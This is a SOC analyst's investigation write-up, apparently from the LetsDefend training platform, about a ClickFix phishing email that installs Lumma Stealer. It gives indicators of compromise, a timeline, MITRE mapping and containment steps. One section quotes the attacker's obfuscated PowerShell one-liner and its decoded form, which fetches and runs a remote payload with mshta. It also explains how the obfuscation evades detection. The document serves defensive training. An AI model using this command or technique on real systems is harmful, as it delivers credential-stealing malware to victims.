#team/blue 
**Related Notes:** [[Alert Investigation Checklist - LetsDefend]]
**Platform:** LetsDefend  
**Event ID:** 316  
**Rule:** SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing  
**Date Investigated:** Mar 13, 2025  
**Analyst:** Void  
**Verdict:** True Positive | Contained

---

## Alert Details

|Field|Value|
|---|---|
|Event Time|Mar 13, 2025 09:44 AM|
|SMTP Address|132.232.40.201|
|Source Address|update@windows-update.site|
|Destination Address|dylan@letsdefend.io|
|Internal Destination|172.16.20.3|
|Destination Port|25 (SMTP)|
|Email Subject|Upgrade your system to Windows 11 Pro for FREE|
|Device Action|Allowed|

---

## IP and Domain Reputation

|Indicator|Source|Result|
|---|---|---|
|132.232.40.201|VirusTotal|2/94 flagged malicious|
|132.232.40.201|AbuseIPDB|5 reports, 0% confidence|
|132.232.40.201|LetsDefend Threat Intel|Tagged — Lumma Stealer, Malicious|
|132.232.40.201|VirusTotal Community|Identified as Cobalt Strike C2 server|
|windows-update.site|VirusTotal|Flagged malicious|
|overcoatpassably.shop|VirusTotal|Flagged malicious — payload delivery domain|

> [!danger] IOCs
> 
> - **132.232.40.201** — Attacker-controlled IP. Confirmed C2 by community intelligence.
> - **windows-update.site** — Phishing domain masquerading as Microsoft update portal
> - **overcoatpassably.shop** — Secondary payload delivery domain
> - **hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4** — Malicious payload URL

---

## Attack Timeline

```
Mar 13, 2025
|
|-- 09:44 AM -- Phishing email delivered to dylan@letsdefend.io
|               From: update@windows-update.site
|               Subject: Upgrade your system to Windows 11 Pro for FREE
|               SMTP relay: 132.232.40.201
|               Device Action: ALLOWED
|
|-- 23:26:08 -- Victim (Dylan) accesses windows-update.site
|               ClickFix page loaded — fake reCAPTCHA prompt displayed
|               User instructed to paste and run a command
|
|-- 23:26:08+ - explorer.exe spawns PowerShell.exe
|               PowerShell executes obfuscated command
|               mshta.exe spawned by PowerShell
|               mshta.exe fetches maloy.mp4 from overcoatpassably.shop
|               Payload executed in memory — never written to disk as a process
|
|-- Post-execution - Outbound connection from victim machine to 132.232.40.201:443
                    HTTPS used to blend C2 traffic with legitimate web traffic
```

> [!warning] Timestamp Note Email alert triggered at 09:44 AM. Victim accessed the phishing site at 23:26:08. There is approximately a 13-hour gap between delivery and execution — the user likely opened the email later in the day. This is normal for phishing campaigns.

---

## How the Attack Works

**ClickFix Phishing** is a social engineering technique where the victim is presented with a fake error or verification page — in this case a fake reCAPTCHA — and instructed to manually paste a command into their Run dialog or terminal to "fix" it.

**Attack chain:**

1. Phishing email delivered with a link to `windows-update.site`
2. Victim clicks the link and lands on the ClickFix page
3. Page displays a fake reCAPTCHA with the message: _"I am not a robot - reCAPTCHA Verification ID: 3824"_
4. Victim is instructed to paste a command — the obfuscated PowerShell string is already in their clipboard
5. PowerShell deobfuscates and executes the command at runtime
6. `mshta.exe` is launched to fetch the remote payload `maloy.mp4`
7. Payload executes in memory — Lumma Stealer runs via DLL side-loading
8. C2 communication established over HTTPS to 132.232.40.201

> [!info] Why maloy.mp4 The payload is disguised with a `.mp4` extension to appear as a media file and bypass file extension-based detection rules. It is not a video file — it is a malicious executable or DLL fetched and run by mshta.exe directly in memory.

> [!info] Why port 443 only Lumma Stealer deliberately uses HTTPS on port 443 to blend C2 traffic with normal web browsing. The absence of other outbound ports is expected behaviour for this malware family, not a gap in the investigation.

---

## Malicious PowerShell Command

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # "I am not a robot - reCAPTCHA Verification ID: 3824"
```

**Deobfuscated:**

```
mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
```

> [!danger] Obfuscation Technique The `]]]` characters are inserted throughout the string and stripped at runtime using PowerShell's `-replace ']'` operator. This reconstructs `mshta.exe` only when the command executes, bypassing static string-matching detection rules that look for `mshta.exe` in command lines.

---

## Process Chain

```
explorer.exe
    └── PowerShell.exe (-w 1, obfuscated command)
            └── mshta.exe (fetches maloy.mp4 from overcoatpassably.shop)
                    └── [Expected: rundll32.exe or regsvr32.exe — DLL side-loading stage]
```

> [!note] Investigation Gap mshta.exe executes the payload in memory. maloy.mp4 does not appear as a named process. The next expected artifact is rundll32.exe or regsvr32.exe being spawned by mshta.exe for the DLL side-loading stage. This should be verified in the process tree if logs are available.

---

## MITRE ATT&CK Mapping

|Tactic|Technique|ID|Evidence|
|---|---|---|---|
|Initial Access|Phishing: Spearphishing Link|T1566.002|Email with link to windows-update.site delivered to dylan@letsdefend.io|
|Execution|User Execution: Malicious Link|T1204.001|Victim accessed the phishing URL at 23:26:08|
|Execution|Command and Scripting Interpreter: PowerShell|T1059.001|Obfuscated PowerShell command executed via ClickFix paste technique|
|Defense Evasion|Obfuscation: Command Obfuscation|T1027.010|`]]]` insertion with `-replace` to reconstruct `mshta.exe` at runtime|
|Defense Evasion|DLL Side-Loading|T1574.002|Lumma Stealer delivery mechanism — payload loaded via mshta.exe in memory|
|Defense Evasion|Masquerading: Match Legitimate Name or Location|T1036|Payload disguised as `maloy.mp4` to evade file extension detection|
|Command and Control|Application Layer Protocol: Web Protocols|T1071.001|Outbound HTTPS (443) from victim to 132.232.40.201 post-execution|

> [!caution] Mapping Note DLL Side-Loading (T1574.002) is mapped based on known Lumma Stealer behaviour and the mshta.exe execution chain. Direct log evidence of the DLL load was not available in this investigation. This should be verified if memory forensics or EDR telemetry is accessible.

---

## C2 Investigation

**Query:** Outbound connections from victim machine after 23:26:08

**Result:** Outbound connection confirmed to 132.232.40.201 on port 443

**Additional finding:** Secondary payload fetched from overcoatpassably.shop via mshta.exe

> [!note] Attacker Objective Assessment
> 
> |Objective|Result|
> |---|---|
> |Phishing Email Delivered|Achieved|
> |Victim Clicked Link|Achieved|
> |PowerShell Execution|Achieved|
> |Payload Delivery via mshta.exe|Achieved|
> |C2 Communication Established|Achieved — HTTPS to 132.232.40.201:443|
> |Credential / Data Theft|Probable — Lumma Stealer targets browser credentials, cookies, and crypto wallets. Confirmation requires memory forensics.|
> 
> Full attacker success up to payload execution and C2 establishment. Data exfiltration is probable given Lumma Stealer's known capabilities but was not directly confirmed in available logs.

---

## Actions Taken

- Alert classified as True Positive
- Host (Dylan's machine) should be contained immediately
- IOCs to be blocked at perimeter:
    - 132.232.40.201
    - windows-update.site
    - overcoatpassably.shop
- Dylan's credentials, browser sessions, and any stored passwords should be treated as compromised and rotated
- Check for any other internal users who received the same email

> [!danger] Containment Rationale Device Action was Allowed. Payload executed in memory. C2 communication was established. Lumma Stealer is a credential stealer — every saved password, browser cookie, and session token on Dylan's machine should be considered exfiltrated until proven otherwise.

---

## Key Learnings

> [!note] Lessons from This Case
> 
> 1. ClickFix phishing relies entirely on the user manually pasting and running a command — user awareness training directly prevents this attack
> 2. `-replace` operator in PowerShell is a common runtime deobfuscation technique — any PowerShell command using `-replace` on its own string warrants immediate scrutiny
> 3. `mshta.exe` is a living-off-the-land binary (LOLBin) — legitimate Windows tool abused to fetch and execute remote payloads without touching disk
> 4. Payloads disguised with media extensions (.mp4, .jpg) are fetched in memory — absence of a process named after the file does not mean it did not execute
> 5. Lumma Stealer uses HTTPS port 443 exclusively for C2 — no unusual ports does not mean no C2
> 6. Low VirusTotal score (2/94) does not override threat intel tagging — always cross-reference multiple sources

---

## References

- [MITRE T1566.002 — Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
- [MITRE T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE T1574.002 — DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
- [MITRE T1027.010 — Command Obfuscation](https://attack.mitre.org/techniques/T1027/010/)
- [MITRE T1071.001 — Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [Lumma Stealer — Threat Overview](https://malpedia.caaprd.org/actor/lumma)

---
